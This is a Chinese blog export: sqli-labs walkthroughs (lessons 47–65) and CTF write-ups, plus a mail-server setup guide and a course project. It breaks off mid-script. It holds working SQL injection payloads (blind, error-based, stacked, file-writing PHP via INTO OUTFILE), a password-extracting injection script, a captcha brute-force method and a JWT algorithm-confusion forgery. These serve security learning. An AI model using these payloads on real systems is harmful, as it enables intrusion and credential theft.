1http://127.0.0.1/sqli-labs-master/Less-47/index.php?sort=1' and if(ascii(substr(database(),1,1))=115,0,sleep(5))--+ 这里因 database()为 security， 所以第一个字母的 s 的 ascii 为 115， 此处直接显示， 当改为116 或者其他的数字的时候， 就要延时了 （2） procedure analyse 参数后注入 利用 procedure analyse 参数， 我们可以执行报错注入。 同时， 在 procedure analyse 和 order by 之间可以存在 limit 参数， 我们在实际应用中， 往往也可能会存在 limit 后的注入， 可以利用 procedure analyse 进行注入。以下为示范例 1http://127.0.0.1/sqli-labs-master/Less-47/index.php?sort=1' procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)--+ (3)导入导出文件 into outfile 参数 1http://172.18.9.91/sqli-labs-master/Less-47/?sort=1' into outfile \"D:\\\\phpStudy\\\\WWW\\\\sqli-labs-master\\\\test.txt\"-- + 将查询结果导入到文件当中 可以考虑上传网马，利用lines terminated by. into outfile D:\\phpStudy\\WWW\\sqli-labs-master\\test.txt terminated by 0x(网马进行16进制转换) 1http://172.18.9.91/sqli-labs-master/Less-47/?sort=1' into outfile \"D:\\\\phpStudy\\\\WWW\\\\sqli-labs-master\\\\test.php\" lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020--+ 此处16进制文件为 &lt;?php phpinfo();?&gt; 访问test.php less48该关卡和less46的区别在于报错注入无法使用，不进行错误回显，但是其余方法是可以使用的。 可以利用sort=rand(true/false)进行判断 1http://172.18.9.91/sqli-labs-master/Less-48/?sort=rand(ascii(left(database(),1))=178) 1http://172.18.9.91/sqli-labs-master/Less-48/?sort=rand(ascii(left(database(),1))=115) and后的延时注入 1http://172.18.9.91/sqli-labs-master/Less-48/?sort=1%20and%20(if(ascii(substr(database(),1,1))=115,0,sleep(5))) 同样可以使用into outfile进行 1http://172.18.9.91/sqli-labs-master/Less-47/?sort=1 into outfile \"路径\" less49本关卡与less47相似，区别在于没有错误回显，但是可以通过延时注入和导入文件注入的方式进行。 延时注入： 1http://172.18.9.91/sqli-labs-master/Less-49/?sort=1' and (if(ascii(substr((select username from users where id=1),1,1))=69,0,sleep(5)))--+ 或者利用into outfile进行注入： 1http://172.18.9.91/sqli-labs-master/Less-49/?sort=1' into outfile \"D:\\\\phpStudy\\\\WWW\\\\sqli-labs-master\\\\test.php\" lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020--+ less50该关卡开始进行的是 order by stacked injection 执行sql语句使用的是mysqli-multi_query()函数，而之前使用的是mysqli_query()函数，两者的区别在于mysqli_multi_query()可以执行多个sql语句，而mysqli_query()只能执行一个sql语句，由此可以执行多个sql语句进行，也就是之前的stacked injection。 直接构造playload： 1http://172.18.9.91/sqli-labs-master/Less-50/index.php?sort=1;create table less50 like users 也就是跟前面的stacked injection一样的，就不详细说了。 less51本关卡与less50最主要的区别在于sql查询语句中对传入参数的处理 1SELECT * FROM users ORDER BY '$id' 在此关卡要进行stacked injection，要注释掉&#39;,playload如下： 1http://172.18.9.91/sqli-labs-master/Less-51/index.php?sort=1';create table less51 like users--+ less52与less50是一样的，区别在于mysql错误不会再前台显示，但是对于堆叠注入没有影响。 1http://172.18.9.91/sqli-labs-master/Less-52/index.php?sort=1;create table less52 like users 就不截图了 less53与less51是一样的，区别也在于mysql错误不回显，但是不影响堆叠注入。 1http://172.18.9.91/sqli-labs-master/Less-53/index.php?sort=1';create table less53 like users--+ 第四部分/page-4 Challengesless54此系列主要是一个进阶的学习， 将前面学到的知识进行更深次的运用。 这一关我们主要考察的依旧是字符型注入， 但是只能尝试十次。 所以需要在尝试的时候进行思考。 如何能更少的减少次数。 这里的表名和密码等是每十次尝试后就强制进行更换。 有键入数据的界面得知，数据库的名字为challenges，所以只需从获取表名开始。 1http://172.18.9.91/sqli-labs-master/Less-54/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_security='challenges'--+ 获知表名：ckcibj2h4j，找到该表的所有列 1http://172.18.9.91/sqli-labs-master/Less-54/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='ckcibj2h4j'--+ 获取到所有列：id,sessid,secret_IZGY,tryy，尝试将所有的数据进行查看，此处知道密码在secret_IZGY列中，所以直接查看该列的内容。 1http://172.18.9.91/sqli-labs-master/Less-54/?id=-1' union select 1,2,group_concat(secret_IZGY) from challenges.ckcibj2h4j--+ 获得密码：31RUuO2jP4KOXg2plHOs2U5s，提交 其实实际渗透测试当中， 我们可以利用更换 ip（可以考虑代理） 或者更换浏览器等， 要看服务器端检测什么内容进行限制 less55本关卡的sql语句为： 1SELECT * FROM security.users WHERE id=($id) LIMIT 0,1 这边与less54是一样的，只需将id进行一个处理，只需要)即可，但是这边要求次数为14次。 playload 123456http://172.18.9.91/sqli-labs-master/Less-55/?id=-1) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='challenges'--+获得表名：4w6ojib0irhttp://172.18.9.91/sqli-labs-master/Less-55/?id=-1) union select 1,2,group_concat(column_name) from information_schema.columns where table_name='4w6ojib0ir'--+获得列名：id,sessid,secret_Q2XN,tryyhttp://172.18.9.91/sqli-labs-master/Less-55/?id=-1) union select 1,2,group_concat(secret_Q2XN) from challenges.4w6ojib0ir--+获得密码：yOzUKUnWHxY5wz79sJpAB9W8 less56与less54 55形式一致，查看sql查询语句 1SELECT * FROM security.users WHERE id=('$id') LIMIT 0,1 因此该关卡playload如下： 123456http://172.18.9.91/sqli-labs-master/Less-56/?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='challenges'--+获得表名:dblwc23jmyhttp://172.18.9.91/sqli-labs-master/Less-56/?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='dblwc23jmy'--+获得列名：id,sessid,secret_KJEU,tryyhttp://172.18.9.91/sqli-labs-master/Less-56/?id=-1') union select 1,2,group_concat(secret_KJEU) from challenges.dblwc23jmy--+获得密码：qOHweRkLp9NGqcOXfRWXmhy5 less57123$id= '\"'.$id.'\"';// Querry DB to get the correct output$sql=\"SELECT * FROM security.users WHERE id=$id LIMIT 0,1\"; 从代码中看到对id进行双引号处理，所以在构造的时候也需要进行双引号处理。 playload 1234http://172.18.9.91/sqli-labs-master/Less-57/?id=-1\" union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='challenges'--+获取表名：dblwc23jmy......参考上面 less58从源码看，执行sql语句之后没有返回数据库中查询到的数据，所以此处不能使用union联合注入，可采用报错注入： 123456http://172.18.9.91/sqli-labs-master/Less-58/?id=-1' union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e))--+获取表名：rjd4tc06eahttp://172.18.9.91/sqli-labs-master/Less-58/?id=-1' union select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='rjd4tc06ea'),0x7e))--+获取列名：id,sessid,secret_ST23,tryyhttp://172.18.9.91/sqli-labs-master/Less-58/?id=-1' union select extractvalue(1,concat(0x7e,(select group_concat(secret_ST23) from challenges.rjd4tc06ea),0x7e))--+获取密码：tLpqQzTWb71CGf1cl8bzxSL1 ps：这边只有五次机会，要注意 less59查看源码，发现与less58一致，只是id的处理不一样，无需加单引号 123456http://172.18.9.91/sqli-labs-master/Less-59/?id=-1 union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e))--+获得表名：9xpilux6yohttp://172.18.9.91/sqli-labs-master/Less-59/?id=-1 union select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='9xpilux6yo'),0x7e))--+获得列名：id,sessid,secret_VZL8,tryyhttp://172.18.9.91/sqli-labs-master/Less-59/?id=-1 union select extractvalue(1,concat(0x7e,(select group_concat(secret_VZL8) from challenges.9xpilux6yo),0x7e))--+获得密码：OO6kBkvJ5VfAalX7e7HXkg6F less60查看源码，发现与less59一致，只是id的处理不一样，增加双引号和括号 1234http://172.18.9.91/sqli-labs-master/Less-60/?id=-1\") union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e))--+获得表名：6nq7xqxsry......参考上面 less61这次比较少见，是使用双括号处理id 12http://172.18.9.91/sqli-labs-master/Less-61/?id=-1')) union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e))--+获得表名：0xoip0m86r less62此处union和报错注入都是失效的，采用延时注入的方式： 1http://172.18.9.91/sqli-labs-master/Less-62/?id=1') and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='challenges'),1,1))=79,0,sleep(10))--+ 当正确的时候时间很短， 当错误的时候时间大于 10 秒， 每位去尝试，逐步才出相关信息 less63与less62一致，但是只能使用延时注入的方式 1http://172.18.9.91/sqli-labs-master/Less-63/?id=1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='challenges'),1,1))=79,0,sleep(10))--+ 当正确的时候时间很短， 当错误的时候时间大于 10 秒 less64sql语句 1SELECT * FROM security.users WHERE id=(($id)) LIMIT 0,1 playload 1http://172.18.9.91/sqli-labs-master/Less-64/?id=1)) and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='challenges'),1,1))=79,0,sleep(10))--+ 当正确的时候时间很短， 当错误的时候时间大于 10 秒。 less65123$id = '\"'.$id.'\"';// Querry DB to get the correct output$sql=\"SELECT * FROM security.users WHERE id=($id) LIMIT 0,1\"; 此处对 id 进行了 “” () 的处理， 构造 payload 时应该注意 playload 1http://172.18.9.91/sqli-labs-master/Less-65/?id=1\") and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='challenges'),1,1))=79,0,sleep(10))--+ !!!!!!!Ending","tags":[]},{"title":"实验室考核部分writeup","date":"2019-09-28T10:59:17.000Z","path":"2019/09/28/实验室考核部分writeup/","text":"miscmisc-1流量分析题，用wireshark打开，往下面看到 GET /GET.rar 进行追踪流： 打开就能看到flag，稍微整理下就可以了 1flag&#123;badd5c8f4eb677abb458585476b91dd3&#125; misc-2下载文件得到一个未知格式的文件，扔进winhex查看，在最后面看见文件里面包含了一个 01.mp3 和 1569070619.png 文件 文件是的编码是以504B0304，对应的类型应该是zip格式，更改文件的后缀为.zip格式，用360压缩解压（360压缩课直接破解伪加密）得到这两个文件 打开图片文件，发现是一个二维码 微信扫一扫扫一下是一串符号串： 1+++++ ++[-&gt; +++++ ++&lt;]&gt; +.--. +.+++ +++++ .---- ----- .++.. +++.- --... +++++ +.&lt; 扔进百度，可以看到大概是brainfuck加密的结果使用网站https://www.splitbrain.org/services/ook进行解密得到一串数字串 1201902252228 然后有一个mp3音频，应该是音频加密，使用MPS3Stoge进行解密 1Decode.exe -X -P 201902252228 01.mp3 可以得到一个01.mp3.txt文件，打开文件得到一串Unicode编码： 1&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#123;&amp;#80;&amp;#114;&amp;#69;&amp;#116;&amp;#84;&amp;#121;&amp;#95;&amp;#49;&amp;#83;&amp;#99;&amp;#67;&amp;#57;&amp;#48;&amp;#49;&amp;#50;&amp;#95;&amp;#103;&amp;#79;&amp;#48;&amp;#100;&amp;#125; Unicode转ascii得到flag 1flag&#123;PrEtTy_1ScC9012_gO0d&#125; misc-3下载得到未知格式的文件，扔进winhex看到都是乱码，没什么用处，然后用notepad++打开，发现是一串字符串，可以看出是当铺密码： 1王人由大工人口中王人大夫人由王中人中工王夫由王口人工由工大由王中人中工王大由工口人中口王由由王中人工大工由由工王人由口夫由由王口王人由工由由大中人口口王口由大工人中工王王由工口王由口王工人口王人由大夫大 经过网站http://www.zjslove.com/3.decode/dangpu/index.html解密得到一串数字 163154302635731623246716034145162324651403206116234541146310711606314115230060154324661406106430631575 观察数字发现所有数字都小于八，猜测是八进制，将八进制转十进制,十进制再转十六进制得到： 1234a = \"63154302635731623246716034145162324651403206116234541146310711606314115230060154324661406106430631575\"b = int(a,8)print(hex(b))//0x666c61677b39353738386539353530343139396133323938666135303036353630623463337d notepad++进行hash-&gt;ascii码得到flag 1flag&#123;95788e95504199a3298fa5006560b4c3&#125; misc-4下载文件打开发现是一串数字 111 1011 00011 1 11 111 1000 001 10 010 1101 1 111 1100 100 00000 11 0 00011 1 111 111 100 0000 11 0001 010 1 0 10000 1100 1001 11 00 大概看一下发现有点像摩斯电码的数字表现形式，将其转换为摩斯电码： 1234567891011a = \"11 1011 00011 1 11 111 1000 001 10 010 1101 1 111 1100 100 00000 11 0 00011 1 111 111 100 0000 11 0001 010 1 0 10000 1100 1001 11 00\"b = \"\"for i in a: if(i==\"1\"): b = b + \"_\" if(i==\"0\"): b = b + \".\" if(i==\" \"): b = b + \" \"print(b)//__ _.__ ...__ _ __ ___ _... .._ _. ._. __._ _ ___ __.. _.. ..... __ . ...__ _ ___ ___ _.. .... __ ..._ ._. _ . _.... __.. _.._ __ .. 再将摩斯电码转换为ascii码 1MY3TMOBUNRQTOZD5ME3TOODHMVRTE6ZXMIYDIMLEGMYTIMRZMVSDEYZQMJRGI 看着这串字符串，肯定不是base64加密，进行base32解密尝试一下： 1f7684la7d&#125;a778gec2&#123;7b041d31429ed2c0bbd 有点像flag，不过是经过了栅栏密码加密的。通过逆向栅栏密码得到flag 1flag&#123;41e07a7e714db677cbd22b8d82039cd4&#125; misc-5把下载的文件放进winhex查看编码 看到既有PNG的开头89504E47又有类似于zip的开头504B1314,将PNG开头删除，并将504B1314修改为504B0304的正确的zip编码开头， 然后将后缀名改为.zip，用360压缩解压文件夹，成功解压文件，得到一张图片和一个txt文档（但是据说原来的zip文档是经过伪加密的，360压缩可以直接绕过伪加密，实际的解法是，在winhex中搜索504B0102然后将后面的09改为00，然后才能解压） 打开txt文档是一串字符串 1IafFRlviO 把图片放进winhex查看，在最后发现一串字符 1VTJGc2RHVmtYMTlnMnFEUnJkdlg1UTFkYTltNlZEUEF4Uys2R0tXcW8wSk92eU4xVjlpWVE3N3JDalAvZS9GZGJmdmlhazY0bWNpeHdpa0ZXcVF0cVE9PQ 将其进行base64进行解密 1U2FsdGVkX19g2qDRrdvX5Q1da9m6VDPAxS+6GKWqo0JOvyN1V9iYQ77rCjP/e/Fdbfviak64mcixwikFWqQtqQ== 再次进行解密,在前面发现 Salted 想到应该是AES加密的方式，将第一次解密得到的字符串和txt中的秘钥进行aes解密得到flag 1flag&#123;7e7dabbbdffbd6a2daa48357aceac4bc&#125; Cryptocrypto-2下载文档解压，得到一个布置格式的附件，用notepad++打开，得到一串字符串和一行字 123..../.../-/.----/.../..-./.----/.-/-.-/.-./.-/./黑板上写着歪歪扭扭的 2 4 1 3 字符串是摩斯电码，在线网站进行解密得到 1HST1SF1AKRAE 再看到2413，尝试每四个字母为一组，2413按原序进行排列得到 1TH1S1SAFAKER 题目提示 1Description: flag:flag&#123;'a~z'+'_'&#125; 把上面的进行改变 1flag&#123;this_is_a_faker&#125; crypto-1解压文件得到一个命名为only_base64的文件夹，打开文件夹又是一个没有格式的文件，notepad++打开，得到以下字符串： 12345v6\"wo5UIP9c4IdCk1o6qZhhB5DKZhVBwBzONl1JRIz:TwB2RyZYBCEVbjBjID17UkUeeDAwPBh1dg86AyAgcSQ4QygYGnAuJQYwzjS0ubQE2hw29FL2qs61ZNOVyFaf6IAjUZ7X8ijuVg:Q1wHADwPAC13PyRlUB90CwUCeHAwGj9hOg0QP34/cjkvY1AOTigOAhktpJryZpVUNpSFi06WlKGkS0Uka6zw1sNCX\"h2urQoyg:SXwmSRMdBz0LJwARAGkObhg6CSo5ZCVcIn0LLnkFfRAiGw9kAzM1GDYthere is the encrypt flag:X1o1VzIPaVgjbmNvCnQAC0ZHY3BbMUkaeylDYWVOCzZDXwJjR3hTFiw3 发现钱三行中间都有冒号，将冒号前后字符串进行base64解密得到一串不知道是什么的东西。。。没出来，后面看出题人的解法，使用python整题直接跑下来的，可以解出得到答案。思路是：前三行冒号前后进行base64解密后进行异或运算，得到的结果和最后一行进行异或运算得到flag 123456789101112131415161718192021//python2import base64x = 'v6\"wo5UIP9c4IdCk1o6qZhhB5DKZhVBwBzONl1JRIz:TwB2RyZYBCEVbjBjID17UkUeeDAwPBh1dg86AyAgcSQ4QygYGnAuJQYw'y = 'zjS0ubQE2hw29FL2qs61ZNOVyFaf6IAjUZ7X8ijuVg:Q1wHADwPAC13PyRlUB90CwUCeHAwGj9hOg0QP34/cjkvY1AOTigOAhkt'z = 'pJryZpVUNpSFi06WlKGkS0Uka6zw1sNCX\"h2urQoyg:SXwmSRMdBz0LJwARAGkObhg6CSo5ZCVcIn0LLnkFfRAiGw9kAzM1GDYt'a, b = x.split(':')c, d = y.split(':')e, f = z.split(':')b = base64.b64decode(b)d = base64.b64decode(d)f = base64.b64decode(f)g = base64.b64decode('X1o1VzIPaVgjbmNvCnQAC0ZHY3BbMUkaeylDYWVOCzZDXwJjR3hTFiw3')flag = ''for i in range(42): t = ord(a[i]) ^ ord(b[i]) flag += chr(ord(g[i]) ^ t)print(flag)//flag&#123;b80f908c-8226-11e9-8b28-88e9fe5197ac&#125; web题有时间再复现吧","tags":[{"name":"ctf","slug":"ctf","permalink":"http://fzykn06.github.io/tags/ctf/"}]},{"title":"网络操作系统课设--基于php与html的cpu调度算法","date":"2019-06-16T06:05:18.000Z","path":"2019/06/16/网络操作系统课设-基于php与html的cpu调度算法/","text":"前言网络操作系统的课程设计，没什么参考其他的，主要是参考了一些函数的使用，自己写了好几天，差点崩溃了自己 主体模块一本模块主要是进行数据填入及传输，确定计算的进程个数，主要是使用html DataFilling.php 12345678&lt;html&gt;&lt;body&gt;&lt;form action=\"ProcessData.php\" method=\"post\"&gt; &lt;center&gt;进程个数：&lt;input type=\"text\" name=\"col\" style= \"text-align:center;vertical-align:middle\"&gt;&lt;input type=\"submit\" value=\"提交\"&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; 模块二本模块主要是进行进程的相关数据填入，包括进程号、达到时间、服务时间，并需要按照到达时间进行填入，主要使用的是php ProcessDate.php 模块三这个模块是核心模块，主要的算法计算等都在此模块，经过计算并打印，包含四种方法：FCFS SJF HRRF RRF,主要是php的运用 AlgorithmCalculation.php 后记以上的代码只是计算调度算法的数据，并不是真的进行调度，但是思想是进行调度，并且是第一稿，没有进程代码优化及算法的优化，能力有限，大概只能写到这边，不喜勿喷","tags":[{"name":"Subject","slug":"Subject","permalink":"http://fzykn06.github.io/tags/Subject/"}]},{"title":"ubuntu16.04 搭建email服务器","date":"2019-05-19T08:53:22.000Z","path":"2019/05/19/ubuntu16-04-搭建email服务器/","text":"前言网络操作系统最后一个实验，看似挺简单的，还是有很多地方需要去注意 实验环境ubuntu16.04 VMware Workstation 15 实验步骤安装postfix1sudo aot-get install mailutils 首次安装会出现问题需要请求空间来安装，输入y即可 在确认配置页面，tab至ok，回车 然后会出现下面的配置页面，共5个选项，我们选择默认选项Internet Site： 下面的配置页面是输入系统邮件的名字，保持默认 配置postfix1sudo vi /etc/postfix/main.cf main.cf主要的配置时 1234567myhostname = sample.test.com //设置系统的主机名mydomain = 126.com //设置域名（我们将让此处设置将成为E-mail地址“@”后面的部分）myorigin = $mydomain //将发信地址“@”后面的部分设置为域名（非系统主机名）inet_interfaces = all //接受来自所有网络的请求mydestination = $myhostname, localhost.$mydomain, localhost, $mydomain //指定发给本地邮件的域名home_mailbox = Maildir/ //指定用户邮箱目录smtp_generic_maps = hash:/etc/postfix/generic 保存退出，然后打开文件 1sudo vim /etc/postfix/generic 添加以下内容： 1你的用户名@你的服务器名 对方回复邮件时你的邮件地址 比如说我的虚拟机服务器名字叫做 linux 我的服务器名字叫 ubuntu 对方回复邮件时的邮件地址为linux@126.com 那添加的内容为 1linux@ubuntu linux@126.com 重启postfix： 1sudo sercive postfix restart 测试1echo \"测试邮件正文\" | mail -s \"邮件标题\" your_email_address 由于这封邮件时发给linux@126.com，是现在使用的账户，所以我们在命令行下，直接输入mail便可查看到我们所发的邮件，并根据信件前面的序号进行阅读，我选择3号信件，也就是刚发送的信件，进行阅读： 参考链接：https://www.jianshu.com/p/78e2e1914ec1 https://blog.csdn.net/hitabc141592/article/details/25986911","tags":[{"name":"Subject","slug":"Subject","permalink":"http://fzykn06.github.io/tags/Subject/"}]},{"title":"ISCC2019部分题解","date":"2019-05-16T12:28:29.000Z","path":"2019/05/16/ISCC2019部分题解/","text":"前言全程都在划水，只提供了几道思路，自己解出来的可能就是最简单的那一两道，然后就是靠各位师傅带我起飞，复现几道web和misc，其他二进制真的不会。。然后在这场比赛需要脑洞大开，flag形式也是变化不定，需要自己去猜格式 webweb1题目链接：http://39.100.83.188:8001/ 进入链接直接就有了源码 1234567891011121314151617&lt;?phperror_reporting(0);require 'flag.php';$value = $_GET['value'];$password = $_GET['password'];$username = '';for ($i = 0; $i &lt; count($value); ++$i) &#123; if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value); else $username .= chr($value[$i]); if ($username == 'w3lc0me_To_ISCC2019' &amp;&amp; intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333) &#123; echo 'Hello '.$username.'!', '&lt;br&gt;', PHP_EOL; echo $flag, '&lt;hr&gt;'; &#125;&#125;highlight_file(__FILE__); 源码分析： username=’w3lc0me_To_ISCC2019’是由value的值通过chr()函数拼接起来的，查询chr()函数的特性，chr()返回的是ASCII码，并且我们所输入的ASCII码要小于32或者大于127，否则就会被unset(),直接传入w3lc0me_To_ISCC2019，则对应的ASCII码会被unset，然后查看官方的chr()相关手册，发现chr()对传入的数字会进行 mod 256 运算，取余 在官方手册的上方就可以看到ord()函数，发现ord()函数是chr()函数的反函数，所以考虑用脚本进行恢复 1234567891011121314//以下脚本来自队友s=\"w3lc0me_To_ISCC2019\"values=\"\"s1=\"&amp;value[]=\"for i in s: value = ord(i)+256 values=values + s1 + str(value)print(values)//获得的内容&amp;value[]=375&amp;value[]=307&amp;value[]=364&amp;value[]=355&amp;value[]=304&amp;value[]=365&amp;value[]=357&amp;value[]=351&amp;value[]=340&amp;value[]=367&amp;value[]=351&amp;value[]=329&amp;value[]=339&amp;value[]=323&amp;value[]=323&amp;value[]=306&amp;value[]=304&amp;value[]=305&amp;value[]=313 解决了这个问题就还剩下后面的intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333)，同样查看intval()函数的特性，当看到这条特性时: 我们知道intval函数处理字符串时，会从头开始检测到除数字外的字母为止，而在代码中intval($password + 1) &gt; 2333,是先将$password + 1后再通过intval进行处理，那么如果我们传入的是十六进制数，例如0x10，那intval(‘0x10’)结果是0，而intval(‘0x10’+1)结果为17 所以我们只要构造以下playload就可以啦： 1http://39.100.83.188:8001/?&amp;value[]=375&amp;value[]=307&amp;value[]=364&amp;value[]=355&amp;value[]=304&amp;value[]=365&amp;value[]=357&amp;value[]=351&amp;value[]=340&amp;value[]=367&amp;value[]=351&amp;value[]=329&amp;value[]=339&amp;value[]=323&amp;value[]=323&amp;value[]=306&amp;value[]=304&amp;value[]=305&amp;value[]=313&amp;password=0x91d flag{8311873e241ccad54463eaa5d4efc1e9} web2题目链接：http://39.100.83.188:8002/ 进入题目，发现是要爆破密码及绕过图片验证码,然后就在网上找了一个工具：PKAV HTTP Fuzzer 1.5.6，工具挺好使的，就是不分图片验证码会出现差错，但是调试一下就行啦 先用bp抓包，获取报文头,放到工具中 12345678910111213141516POST /login.php HTTP/1.1Host: 39.100.83.188:8002Content-Length: 50Cache-Control: max-age=0Origin: http://39.100.83.188:8002Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Referer: http://39.100.83.188:8002/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=4jc9sbpoccp81v7vnqg51ta124Connection: closeusername=admin&amp;pwd=100&amp;user_code=d2ic&amp;Login=submit 查看源码，获得验证码的获取地址 将地址放入工具中，进行调试： 调试完成后进行密码和验证码标记,推荐一个字典生成工具–木头超级字典集 然后就可以进行发包了： 结束后进行长度排序，就可以看到密码是996 拿到密码，就可以拿到flag啦 flag{996_ICU} web3题目链接：http://39.100.83.188:8065 sql-labs 24关原题，考察二次注入 注入点在login_create.php中的username字段，注册用户名为admin’#之后登录admin’#，username字段就赋值给了session中的username字段 在password_change.php中$username是直接从session中取出的，也就是取出的username为admin’#,拼接到sql语句中： 1UPDATE users SET PASSWORD='123' where username='admin'#' and password='$curr_pass' admin用户的密码就被修改为123 但是在这题中没有设置容器，大家都在使用一个数据库，密码也在不断的被人改动，所以会出现改完密码后无法登陆的情况，并且数据库定期修改所有用户密码，所以稳定登陆的方法是不断的发送修改密码的包，如果admin’#用户被注册，可以增加多个# web4题目链接：http://39.100.83.188:8066/ 进入即可获得源码 123456789101112131415161718192021222324&lt;?php error_reporting(0); include(\"flag.php\"); $hashed_key = 'ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a'; $parsed = parse_url($_SERVER['REQUEST_URI']); if(isset($parsed[\"query\"]))&#123; $query = $parsed[\"query\"]; $parsed_query = parse_str($query); if($parsed_query!=NULL)&#123; $action = $parsed_query['action']; &#125; if($action===\"auth\")&#123; $key = $_GET[\"key\"]; $hashed_input = hash('sha256', $key); if($hashed_input!==$hashed_key)&#123; die(\"&lt;img src='cxk.jpg'&gt;\"); &#125; echo $flag; &#125; &#125;else&#123; show_source(__FILE__); &#125;?&gt; 这题的考察点在parse_str变量覆盖，在解析url之后会覆盖原来的变量所以构造sha256($hash_key=1)=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b 所以构造playload： 1http://39.100.83.188:8066/?action=auth&amp;hashed_key=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b&amp;key=1 flag{7he_rea1_f1@g_15_4ere} web5题目链接：http://39.100.83.188:8054/ 进去很奇怪的就一句话： 队友脑洞打开吧，或者说是做得题目比较少，没那么快想到，在报文头部user-agent字段添加Union.373，然后回应报文会有请输入用户名，在post用户名username=admin回复报文请输入密码，再添加密码password=123，恢复成员密码就是flag 看出是sql注入题，尝试普遍的注入方式，发现过滤了# （）extractvalue sleep and username password等 使用万能密码1’ or ‘1登录，发现有回显出用户名 union_373_Tom 有回显使用联合注入的方式 1username=union_373_Tom&amp;password=1' union select 1,2,3 or' 但是因为过滤了括号，所以没办法继续子查询，于是参考下面这篇文章 参考文章https://blog.csdn.net/nzjdsds/article/details/81879181 文章中提到可以进行union order by的方法进行盲注，思路简单而言就是通过 union 使查询结果为 union_373_Tom 和我们拼接上的一行查询结果通过 order by 对密码 password 字段进行排序，并根据回显的用户名信息来判断排序的结果，下面的是来自队友的本地测试结果： 并且因为题目password字段需要闭合单引号，所以采用的是order by 3, ‘1，mysql会先根据逗号前面的进行排序，如果数据相等，则使用逗号后的进行排序 最后使用的盲注playload为： 1username=union_373_Tom&amp;password=1' or '1' union select 1,'a', '1' order by 3, '1 根据order by是对字符串一位一位的进行比较，所以思路就是对用户密码字段进行逐位进行排序比较，并且通过测试，是根据ASCII码值的大小，并且大小写字符排序相同，测试的字典为： 1_ZzYyXxWwVvUuTtSsRrQqPpOoNnMmLlKkJjIiHhGgFfEeDdCcBbAa9876543210 python脚本： 1234567891011121314151617181920import requests url = \"http://39.100.83.188:8054\" headers = &#123; 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36 Union.373' &#125;password = \"\" s = \"_ZzYyXxWwVvUuTtSsRrQqPpOoNnMmLlKkJjIiHhGgFfEeDdCcBbAa9876543210 \" for i in range(1,33): for j in s: p = password + j data = &#123; 'username':'union_373_Tom', 'password':\"1' or '1' union select 1,'hhx','\"+p+\"' from admin order by 3,'1\" &#125; r = requests.post(url,data=data,headers=headers) r.encoding = r.apparent_encoding if 'hhx' in r.text: password = password + j print('password:',password) break 最后密码为1SCC_2OI9 最后提交得到flag：flag{1SCC_2OI9} web6题目链接：http://39.100.83.188:8053/ 注册账户，登录网页端抓包得到回复报文： 但是在回复报文中只有一个token的值有用，将token进行解密 发现是使用jwt生成的token，进入官网https://jwt.io/进行解码，解码之后的格式分为三个部分 Header头部带有加密方式alg：RS256,类型typ：“JWT” Payload中是用户的信息 签名字段使用 RSASHA256 分别对 header、payload、secret 进行加密。且 RSASHA256 为非对称加密需要 公钥与私钥进行解密 查找前端源码，http://39.100.83.188:8053/static/js/common.js 处发现 ajax 请求，验证头部身份认证。验证成功弹出文件路径。猜测需要构造 admin Token 进而得到admin 的 data.links 在源码底部发现公钥公钥获取方式 访问 urlhttp://39.100.83.188:8053/pubkey/7D53337755615CEF7E90384692F85CFB 得到公钥 1&#123;\"pubkey\":\"-----BEGIN PUBLIC KEY-----\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\\nIC+LX+9V/mpyKe9R3wIDAQAB\\n-----END PUBLIC KEY-----\",\"result\":true&#125; 因为私钥无法获取到，所以这时我们就需要将算法修改为HS256,如果将算法从RS256更改为HS256，后端代码会使 用公钥作为秘密密钥，然后使用HS256算法验证签名。生成认证字段的脚本如下： 1234import jwt import base64 public = open('1.txt', 'r').read()print jwt.encode(&#123;\"name\": \"iscc19\",\"priv\": \"admin\"&#125;, 